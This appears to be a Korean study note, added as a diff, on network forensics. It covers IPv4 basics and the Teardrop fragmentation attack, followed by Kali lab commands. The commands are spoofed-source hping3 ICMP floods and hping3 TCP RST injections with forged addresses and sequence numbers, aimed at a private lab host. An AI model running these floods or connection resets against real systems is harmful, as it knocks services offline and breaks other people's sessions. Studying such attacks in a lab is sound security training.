@@ -1,0 +1,37 @@
+
+네트워크 포렌식
+IPv4
+IP는 비연결형, 신뢰할 수 없는 프로토콜.
+ IP는 목적지 주소를 기반으로 라우팅(Routing)을 담당하는 인터넷 계층의 대표 프로토콜, 라우팅은 라우팅 알고리즘을 통해 최적의 경로를 선정하여 목적지를 찾아가는 것을 말한다.
+- 논리적 주소(IP) : 변경이 가능한 주소
+- 물리적 주소(MAC) : 네트워크 인터페이스에 고정 변경이 불가
+- End-to-End Delivery(IP) : End노드(종단노드)간의 라우팅을 담당하는 계층 Host-to-Host 라고도 한다.
+- 가상의/논리적인 연결상태, 통로에 따라 전송 순서 보장하느냐에 따라 (연결지향, 비연결형)으로 나누어 진다.
+- IP는 흐름제어/오류제어/혼잡제어를 하지 않는다.
+- 비연결형 프로토콜(IP)로 연결 상태를 유지하지 않기 때문에 패킷 전송 순서를 보장하지 않는다.
+
+
+디얼드롭 공격(TearDrop Attack) : 잘못된(offset 오류) IP 조각화(Fragmentation) 패킷을 보내서
+상대방 컴퓨터의 패킷 재조립 기능을 혼란시키는 공격.
+공격자는 IP 패킷을 여러 조각(Fragment)으로 나눠 보냄
+조각들의 오프셋(offset) 값이 일부러 겹치게 설정됨
+취약한 운영체제는
+정상적으로 재조립하려다가
+잘못된 오프셋 때문에 메모리 처리 오류 발생
+결국 시스템이 다운되거나 재부팅
+
+root@kali:/home/kali# ping -4 -s 4000 10.0.0.200  
+
+root@kali:/home/kali# hping3 10.0.0.200 -a 1.1.1.1 --icmp  
+root@kali:/home/kali# hping3 10.0.0.200 --spoof 1.1.1.1 --icmp
+root@kali:/home/kali# hping3 10.0.0.200 --spoof 1.1.1.1 --icmp --faster
+root@kali:/home/kali# hping3 10.0.0.200 --spoof 1.1.1.1 --icmp --flood
+root@kali:/home/kali# hping3 --rand-source -1 10.0.0.200
+
+
+hping3 --rst -a 10.0.0.143 -s 23 --setseq 101146557 10.0.0.200 -c 1 -p 39320 -k
+
+root@kali:/home/kali# hping3 --rst -a 10.0.0.200 -s 58916 --setseq 1347897624 10.0.0.143 -c 1 -p 23 -k
+
+root@kali:/home/kali# hping3 --rst -a 10.0.0.143 -s 23 --setseq 3081927424 10.0.0.200 -c 1 -p 39854 -k
+
